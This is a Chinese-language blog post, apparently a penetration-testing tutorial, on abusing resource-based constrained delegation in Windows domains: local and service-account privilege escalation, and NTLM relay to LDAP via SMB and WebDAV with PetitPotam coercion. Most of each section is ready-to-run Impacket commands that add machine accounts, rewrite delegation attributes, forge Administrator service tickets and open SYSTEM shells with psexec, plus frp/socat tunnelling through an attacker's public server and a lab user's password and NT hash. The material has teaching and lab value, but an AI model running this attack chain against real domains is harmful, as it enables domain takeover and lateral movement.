+<h4 id="域用户本地提权"><a href="#域用户本地提权" class="headerlink" title="域用户本地提权"></a>域用户本地提权</h4><p>我们拿到了一个域内用户，但是发现该用户是普通用户，没有这台域内主机的<code>administrator</code>权限，可以利用<code>RBCD</code>进行本地提权。</p>
+<p><strong>思路：</strong></p>
+<p>1、利用可控域用户创建一个机器账户 (每个域用户默认可以创建10个机器账户)</p>
+<p>2、修改目标主机的 <code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性，使其指向新创建机器账户的<code>SID</code></p>
+<p>3、利用该机器账户的凭证为”跳板”，请求以administrator身份访问目标主机的票据，配合<code>psexec</code>实现本地提权。</p>
+<p>首先使用<code>Adfind.exe</code>查询域内机器的<code>mS-DS-CreatorSID</code>，与当前用户的<code>SID</code>进行比较</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b</span> <span class="string">&quot;DC=hack-my,DC=com&quot;</span> -f <span class="string">&quot;objectClass=computer&quot;</span> <span class="meta">cn</span> ms-DS-CreatorSID</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531133606395.png" alt="image-20250531133606395"></p>
+<p>可知<code>TEST-PC</code>这台机器是通过我们拿到的这个域用户<code>hack-my\test</code>加入域中的，那么当前域用户可以修改这台主机的<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性。</p>
+<p>使用当前域用户新建一个机器账户</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> addcomputer.<span class="keyword">py</span> hack-my.<span class="keyword">com</span>/test:<span class="string">&quot;密码&quot;</span> -computer-name TEST$ -computer-pass <span class="number">123456</span> -dc-host DC.hack-my.<span class="keyword">com</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531134748299.png" alt="image-20250531134748299"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531134844193.png" alt="image-20250531134844193"></p>
+<p>然后配置<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性，让<code>TEST$</code>机器账户获得了假扮任意用户访问<code>TEST-PC$</code>的能力，<code>[*] TEST$ can already impersonate users on TEST-PC$ via S4U2Proxy</code></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> rbcd.<span class="keyword">py</span> hack-my.<span class="keyword">com</span>/test:<span class="string">&quot;密码&quot;</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span>  -action <span class="keyword">write</span> -delegate-<span class="keyword">to</span> TEST-PC$ -delegate-from TEST$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531141212286.png" alt="image-20250531141212286"></p>
+<p>利用<code>S4U</code>协议伪造<code>Administrator</code>的<code>ST</code></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> getST.<span class="keyword">py</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span> -spn cifs/TEST-PC.hack-my.<span class="keyword">com</span> -impersonate Administrator hack-my.<span class="keyword">com</span>/test$:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531141411428.png" alt="image-20250531141411428"></p>
+<p>利用拿到的<code>ST</code>配合<code>psexec</code>提权至<code>system</code></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_TEST-PC<span class="selector-class">.hack-my</span>.com@HACK-MY<span class="selector-class">.COM</span><span class="selector-class">.ccache</span>   <span class="comment">//linux/MacOS写法</span></span><br><span class="line">set KRB5CCNAME=Administrator@cifs_TEST-PC<span class="selector-class">.hack-my</span>.com@HACK-MY<span class="selector-class">.COM</span><span class="selector-class">.ccache</span>  <span class="comment">//Windows写法</span></span><br><span class="line">python psexec<span class="selector-class">.py</span> -no-pass -k TEST-PC<span class="selector-class">.hack-my</span><span class="selector-class">.com</span> -target-ip <span class="number">192.168</span>.<span class="number">43.42</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601092908416.png" alt="image-20250601092908416"></p>
+<h4 id="域内服务账户提权"><a href="#域内服务账户提权" class="headerlink" title="域内服务账户提权"></a>域内服务账户提权</h4><p><code>IIS</code>、<code>MSSQL</code>、<code>Network Service</code>等服务账户出网时使用的是本地的机器账户，访问域内资源时能够以机器账户的身份修改自身的委派属性，从而实现本地提权。</p>
+<p>以设置了服务账户<code>IIS</code>的<code>WIN2008-WEB</code>为例，提权原理和上文的”域用户本地提权”差别不大</p>
+<p><code>SharpAllowedToAct</code>工具需要<code>.NET</code>环境，自行下载</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpAllowedToAct<span class="selector-class">.exe</span> -m test2 -<span class="selector-tag">p</span> <span class="string">&quot;123456&quot;</span> -t WIN2008-WEB -<span class="selector-tag">a</span> dc<span class="selector-class">.hack-my</span><span class="selector-class">.com</span> -d hack-my.com</span><br></pre></td></tr></table></figure>
+
+<p>然后和上面一样的思路</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> getST.<span class="keyword">py</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span> -spn cifs/WIN2008-WEB.hack-my.<span class="keyword">com</span> -impersonate Administrator hack-my.<span class="keyword">com</span>/test2$:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="attribute">KRB5CCNAME</span>=Administrator@cifs_TEST-PC.hack-my.com@HACK-MY.COM.ccache</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> psexec.py -<span class="literal">no</span>-pass -k WIN2008-WEB.hack-my.com -target-ip <span class="number">192.168.43.216</span> -dc-ip <span class="number">192.168.43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601123903774.png" alt="image-20250601123903774"></p>
+<h4 id="NTLM-Relay-to-ldap-RBCD"><a href="#NTLM-Relay-to-ldap-RBCD" class="headerlink" title="NTLM Relay to ldap + RBCD"></a>NTLM Relay to ldap + RBCD</h4><p><strong>(1) SMB</strong></p>
+<p>默认情况下,<code> LDAP</code> 的签名策略为协商签名 (是否签名由客户端决定), 当使用 <code>SMB</code> 协议发起<code> LDAP</code> 请求时, 就会要求<code>LDAP</code>服务器对<code>NTLM</code>认证请求强制签名, 所以一般来说无法通过<code>SMB</code>协议进行<code> NTLM Relay to LDAP</code></p>
+<p>但是 2019 年爆出了<code> CVE-2019-1040</code> 漏洞, 它能够绕过<code> NTLM MIC</code> 的防护机制, 修改<code>NTLM</code>请求中的某些标志位, 使得客户端对于 <code>SMB</code> 发起的<code>LDAP</code>请求不要求签名, 从而实现<code> NTLM Relay</code></p>
+<p>结合强制认证 (例如 <code>SpoolSample</code>, <code>PetitPotam</code>) 配合<code>RBCD</code><strong>可以实现横向移动</strong></p>
+<p><strong>攻击流程</strong></p>
+<p>先通过<code>PetitPotam</code>，打印机漏洞触发<code>DC</code>&#x2F;目标主机的<code>NTLM</code>认证请求，将认证流量中继到目标<code>LDAP</code>服务器(通常就是域控)</p>
+<p>攻击者利用中继的凭据，在<code>DC</code>&#x2F;目标主机上配置<code>RBCD</code>策略，将攻击者添加的机器账户添加到目标主机的<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性中，然后伪造用户访问提权即可拿下目标主机</p>
+<p><strong>复现环境</strong></p>
+<p><strong>TEST-PC</strong>：<code>Windows7</code>，已经拿下的域内主机，<code>192.168.43.42</code></p>
+<p><strong>DC</strong>：<code>Windows Server 2012</code>，域控，<code>192.168.43.100</code></p>
+<p><strong>WIN2008-WEB</strong>：<code>Windows Server 2008</code>，IIS服务器，<code>192.168.43.216</code></p>
+<p><strong>Kali_linux</strong>：攻击机，<code>192.168.43.78</code></p>
+<p><strong>目标</strong>：拿下<code>TEST-PC</code>后，利用<code>NTLM Relay to ldap + RBCD</code>横向拿下<code>WIN2008-WEB</code>这台主机</p>
+<p>首先添加机器账户<code>test</code></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> addcomputer.<span class="keyword">py</span> hack-my.<span class="keyword">com</span>/test:<span class="string">&quot;密码&quot;</span> -computer-name TEST$ -computer-pass <span class="number">123456</span> -dc-host DC.hack-my.<span class="keyword">com</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span></span><br></pre></td></tr></table></figure>
+
+<p>启动<code>ntlmrelayx</code>等待目标主机连接</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap:<span class="string">//192.168.43.100</span> <span class="params">--remove-mic</span> <span class="params">--delegate-access</span> <span class="params">--escalate-user</span> TEST$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601150653864.png" alt="image-20250601150653864"></p>
+<p>利用<code>PetitPotam</code>让目标机器发起对攻击机的SMB请求</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> PetitPotam.py -d hack-my.com -u test -p <span class="string">&quot;密码&quot;</span> <span class="number">192.168.43.78</span> <span class="number">192.168.43.216</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601154759136.png" alt="image-20250601154759136"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601154823042.png" alt="image-20250601154823042"></p>
+<p>伪造管理员访问目标主机，配合<code>psexec</code>拿下<code>WIN2008-WEB</code>的<code>system</code>权限</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> getST.<span class="keyword">py</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span> -spn cifs/WIN2008-WEB.hack-my.<span class="keyword">com</span> -impersonate Administrator hack-my.<span class="keyword">com</span>/test$:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">export</span> KRB5CCNAME=Administrator<span class="variable">@cifs_WIN2008</span>-WEB.hack-my.com<span class="variable">@HACK</span>-MY.COM.ccache</span><br><span class="line">python psexec.py -k -<span class="literal">no</span>-pass WIN2008-WEB.hack-my.com -target-ip <span class="number">192.168.43.216</span> -dc-ip <span class="number">192.168.43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601160400252.png" alt="image-20250601160400252"></p>
+<p><strong>(2) WebDAV</strong></p>
+<p>首先先了解<code>WebDAV</code>的概念，<code>WebDAV</code>是一种基于<code>HTTP</code>的通信协议</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602092703350.png" alt="image-20250602092703350"></p>
+<p>对于<code>HTTP(WebDAV)</code>协议发起的 <code>LDAP</code> 请求是不要求强制签名的，因此可以绕过签名实现<code>NTLM Relay</code></p>
+<p><code>Windows</code>使用<code>WebClient</code>服务实现<code>WebDAV</code>，<code>WebDAV</code>通过<code>\\evilhost@80\webdav\kagty1.txt</code>这种 UNC 格式访问攻击者的 HTTP 服务器。</p>
+<p><strong>注意：</strong></p>
+<p>1、<code>Windows Workstation</code>默认安装 <code>WebClient</code>服务，但是需要手动启动，<code>Windows Server</code>则默认未安装<code>WebClient</code></p>
+<p>2、<code>WebClient</code>仅对本地内部网或收信任的站点列表中的目自动使用当前用户凭据进行<code>NTLM</code>认证，所以在复现&#x2F;攻击前，需要利用已经获取的域用户权限，在域内为攻击机添加一条<code>dns</code>记录。</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3">https://github.com/dirkjanm/krbrelayx，使用方法参考文档</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> dnstool.<span class="keyword">py</span> -<span class="keyword">u</span> hack-my.<span class="keyword">com</span>\win2008 -<span class="keyword">p</span> <span class="string">&quot;密码&quot;</span> -r evil.hack-my.<span class="keyword">com</span> -d <span class="number">192.168</span>.<span class="number">43.78</span> --action <span class="built_in">add</span> ldap://<span class="number">192.168</span>.<span class="number">43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击流程</strong></p>
+<p>(1) 拿下一名域用户</p>
+<p>(2) 探测开启<code>WebClient</code></p>
+<p>(3) 在域内为攻击机添加<code>DNS</code>解析</p>
+<p>(4) 强制<code>WebClient</code>对攻击机指定端口进行身份验证</p>
+<p>(5) <code>RBCD</code>攻击</p>
+<p><strong>复现环境 (春秋云镜Spoofing)</strong></p>
+<p><strong>攻击者公网服务器：</strong><code>Ubuntu</code>，<code>101.42.13.105</code></p>
+<p><strong>入口机：</strong><code>Ubuntu</code>，<code>39.99.154.66</code> | <code>172.22.11.76</code></p>
+<p>**目标机器：<code>**XIAORANG\XR-LCM3AE8B</code>，<code>172.22.11.26</code>，开启<code>WebClient</code>服务，不出网</p>
+<p>**域控：<code>**XIAORANG\XIAORANG-DC</code>，<code>172.22.11.6</code></p>
+<p>**已经拿下的域用户和域内机器：<code>**Windows Server 2008</code>，<code>yangmei : xrihGHgoNZQ</code></p>
+<p>**目标：**利用拿下的域用户和<code>WIN2008</code>，横向拿下<code>172.22.11.26</code>这台机器</p>
+<p><strong>既然目标机器不出网，可以用frp+socat来实现。</strong></p>
+<p><strong>将入口机<code>172.22.11.76</code>作为”跳板机”，让目标机器将流量转发至<code>172.22.11.76:80</code>，利用<code>socat</code>将<code>172.22.11.76:80</code>的流量转发至公网服务器<code>101.42.13.105:7000</code>，公网服务器通过<code>frp</code>内网穿透将流量转发至<code>kali linux</code>的<code>80</code>端口。</strong></p>
+<p><code>frps.toml</code></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bindPort</span> <span class="operator">=</span> <span class="number">6000</span></span><br></pre></td></tr></table></figure>
+
+<p><code>frpc.toml</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;101.42.13.105&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">6000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;attack&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure>
+
+<p>跳板机上传<code>socat</code>进行端口转发</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">80</span>,fork TCP:<span class="number">101.42.13.105:7000</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击机<code>ntlmrelyx</code>开启监听，设置通过<code>NTLM</code>中继来配置<code>RBCD</code></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python ntlmrelayx.py -t ldap:<span class="string">//172.22.11.6</span> <span class="params">--escalate-user</span> XR-DESKTOP\$ <span class="params">--delegate-access</span> <span class="params">--no-dump</span></span><br></pre></td></tr></table></figure>
+
+<p>通过利用<code>PetitPotam</code>强制目标主机<code>172.22.11.26</code>认证到<code>172.22.11.76</code> (出网的<code>ubuntu</code>服务器) -&gt; 会被转发到攻击机<code>80</code>端口</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602210622949.png" alt="image-20250602210622949"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python PetitPotam<span class="selector-class">.py</span> -u yangmei -<span class="selector-tag">p</span> <span class="string">&quot;xrihGHgoNZQ&quot;</span> -d xiaorang<span class="selector-class">.lab</span> ubuntu@<span class="number">80</span>/webdav <span class="number">172.22</span>.<span class="number">11.26</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602211546827.png" alt="image-20250602211546827"></p>
+<p>成功配置<code>RBCD</code></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602211606974.png" alt="image-20250602211606974"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python getST<span class="selector-class">.py</span> -dc-ip <span class="number">172.22</span>.<span class="number">11.6</span> -spn cifs/XR-LCM3AE8B<span class="selector-class">.xiaorang</span><span class="selector-class">.lab</span> -impersonate administrator xiaorang.lab/XR-DESKTOP\$ -hashes :<span class="number">29</span>a34bea4cdae24fdb6661b2071d9ffd</span><br></pre></td></tr></table></figure>
+
+<p>或者可以利用拿到的域用户新建一个机器账户，然后用明文密码拿目标主机的白银票据</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python addcomputer.py xiaorang.<span class="keyword">lab</span>/yangmei:<span class="string">&quot;xrihGHgoNZQ&quot;</span> -computer-name <span class="keyword">TEST</span>$ -computer-pass 123456 -dc-host XIAORANG-DC.xiaorang.<span class="keyword">lab</span> -dc-ip 172.22.11.6</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST<span class="selector-class">.py</span> -dc-ip <span class="number">172.22</span>.<span class="number">11.6</span> -spn cifs/XR-LCM3AE8B<span class="selector-class">.xiaorang</span><span class="selector-class">.lab</span> -impersonate administrator xiaorang.lab/XR-DESKTOP\$:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602212944606.png" alt="image-20250602212944606"></p>
+<p>横向拿到目标主机<code>system</code>权限</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">export</span> KRB5CCNAME=administrator<span class="variable">@cifs_XR</span>-LCM3AE8B.xiaorang.lab<span class="variable">@XIAORANG</span>.LAB.ccache</span><br><span class="line">proxychains4 python psexec.py  <span class="string">&quot;XR-LCM3AE8B.xiaorang.lab&quot;</span> -target-ip <span class="number">172.22.11.26</span> -dc-ip <span class="number">172.22.11.6</span> -<span class="literal">no</span>-pass -k</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602214113408.png" alt="image-20250602214113408"></p>
+
+      </div>
+    </div>
+</div>
+
+<div class="post-category">
+
+    <div id="p-meta-i">
+        
+              
+                <a class="hover-with-bg" href="/categories/Windows%E5%9F%9F%E6%B8%97%E9%80%8F/">Windows域渗透</a>
+              
+          
+          
+              
+                <a class="hover-with-bg" href="/tags/Windows%E5%9F%9F%E6%B8%97%E9%80%8F/"># Windows域渗透</a>
+              
+          
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+
+  <div class="post-copyright">
+    <p style="margin: 5px 0;">文章作者：<a target="_blank" rel="noopener" href="http://github.com/KaGty1">KaGty1</a></p>
+    <p style="margin: 5px 0;">文章链接：<a href="http://kagty1.github.io/2025/06/04/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/">http://kagty1.github.io/2025/06/04/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/</a></p>
+    <p style="margin: 5px 0;">版权声明：本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，谢谢。</p>
+  </div>
+  
+</div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        <!-- Detalk.js https://detalk.js.org/ -->
+
+    <div id="miracle-comments">
+        <div id="detalk">
+            <div style="width: 100%; text-align: center; display: flex; justify-content: center; align-items: center;">
+                <svg width="30px" height="30px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg"><g><animateTransform attributeName="transform" type="rotate" values="0 33 33;270 33 33" begin="0s" dur="1.4s" fill="freeze" repeatCount="indefinite"></animateTransform>
+                    <circle fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30" stroke-dasharray="187" stroke-dashoffset="610"><animate attributeName="stroke" values="#4285F4;#DE3E35;#F7C223;#1B9A59;#4285F4" begin="0s" dur="5.6s" fill="freeze" repeatCount="indefinite"></animate><animateTransform attributeName="transform" type="rotate" values="0 33 33;135 33 33;450 33 33" begin="0s" dur="1.4s" fill="freeze" repeatCount="indefinite"></animateTransform><animate attributeName="stroke-dashoffset" values="187;46.75;187" begin="0s" dur="1.4s" fill="freeze" repeatCount="indefinite"></animate>
+                </circle></g></svg>
+            </div>
+        </div>
+    </div>
+    <style>
+        .comment-title h3 {
+            font-size: 1.25rem;
+        }
+        .detalk-container .input-label label {
+            width: 30% !important;
+        }
+        .detalk-container .input-data .input-area input {
+            width: 70% !important;
+        }
+    </style>
+    <script>
+        function loadComment() {
+            try {
+                loadScriptFile({
+                    url: "https://cdn.jsdelivr.net/npm/@detalk/static@1.3.1/dist/detalk.js",
+                    loadType: "async",
+                    cb: () => {
+                        detalk.init({"url":"","el":"#detalk","label":{"admin":{"name":"博主","class":"label-green"}},"recaptchaSiteKey":null,"login":{"github":null},"owo":null});
+                    },
+                });
+            } catch (e) {
+                document.getElementById("loadCommentBtn").innerText = "无法加载 Detalk.js 评论";
+                console.info(e);
+            }
+        }
+        function loadDetalk() {
+            try {
+                loadComment();
+            } catch (e) {
+                console.log(e);
+            }
+        }
+        var runningOnBrowser = typeof window !== "undefined";
+
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var observer = new IntersectionObserver(function(entries) {
+                if (entries[0].isIntersecting) {
+                    loadDetalk();
+                    observer.disconnect();
+                }
+                }, { threshold: [0] });
+                observer.observe(document.getElementById('miracle-comments'));
+            } else {
+                loadDetalk();
+            }
+        }, 1);
+    </script>
+
+
+    </div>
+
+</article>
+
+
+        </div>
+        
+<footer class="text-center">
+    
+    
+    
+    
+    
+    <p>&copy;  2025 - &nbsp;&nbsp;知行合一 自强不息</p>
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/oCoke/hexo-theme-miracle" target="_blank">Miracle</a></p>
+    
+    
+</footer>
+
+<div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
+    
+    
+      <a class="toc-btn" id="share-btn"><i>
+        <svg t="1670124379155" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2683" width="25" height="25"><path d="M395.946667 234.666667v64H256v469.333333h512V522.666667h64V768a64 64 0 0 1-64 64H256a64 64 0 0 1-64-64V298.666667a64 64 0 0 1 64-64h139.946667z m335.850666-87.914667l150.848 150.826667-158.378666 158.4-45.269334-45.248L748.394667 341.333333H672c-121.685333 0-220.714667 97.024-223.914667 217.941334L448 565.333333v85.333334h-64v-85.333334C384 406.272 512.938667 277.333333 672 277.333333h99.861333l-85.312-85.333333 45.248-45.248z" p-id="2684" fill="var(--first-text-color)"></path></svg>
+      </i></a>
+    
+    <a href="javascript:window.scrollTo({top:0,behavior:'smooth'});" class="click-btn">
+      <i id="i-up"></i>
+    </a>
+</div>
+
+<!-- SCRIPTS -->
+
+
+
+
+
+
+<script>
+    document.getElementById("btn-dropdown").addEventListener('click', () => {
+      toggleClass("#dropdown-menus","display-inline");
+    });
+    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/oCoke/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');
+
+    
+
+    
+  /* 小彩蛋: 饮茶先啦 */
+  setTimeout(() => {
+    var time = new Date();
+    if (time.getHours() == 15) {
+      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
+      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
+    }
+  },1);
+    
+</script>
+
+
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
+
+
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
+
+
+
+    <script>
+        query("#share-btn")[0].onclick = async () => {
+            let url = `${location.protocol}//${location.hostname}${location.port ? ":"+location.port:location.port}${location.pathname}#read=${sessionStorage.getItem(location.pathname+"_read_y") || ""}`;
+            try {
+                await navigator.clipboard.writeText(url);
+                prompt_core("分享链接已经复制至剪贴板", 4800, true);
+            } catch(e) {
+                prompt_core("分享链接复制失败，请手动复制<br/>"+url, 4800, false);
+            }
+        }
+    </script>
+
+
+
+
+
+    <script>
+        setTimeout(() => {
+            loadScriptFile({
+                url: "//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",
+                loadType: "async"
+            });
+        },0);
+    </script>
+
+
+
+    <script>
+        const getScrollPosition = (el = window) => ({
+            x: el.pageXOffset !== undefined ? el.pageXOffset : el.scrollLeft,
+            y: el.pageYOffset !== undefined ? el.pageYOffset : el.scrollTop
+        });
+        // 此处的 750 是「页面元素的最大宽度」
+        var wx = document.getElementsByClassName("article-m")[0].clientWidth;
+        var wy = document.getElementsByClassName("article-m")[0].clientHeight;
+        function windowScroll() {
+            // 反复修改 确保页面尺寸不改变
+            wx = document.getElementsByClassName("article-m")[0].clientWidth;
+            wy = document.getElementsByClassName("article-m")[0].clientHeight;
+            let y = Math.round(getScrollPosition().y);
+            // console.log(y);
+            // 组合字符串，同时记录页面坐标，页面宽度和高度
+            let p = `${y}:${wx}:${wy}`;
+            // 写入到 sessionStorage 中
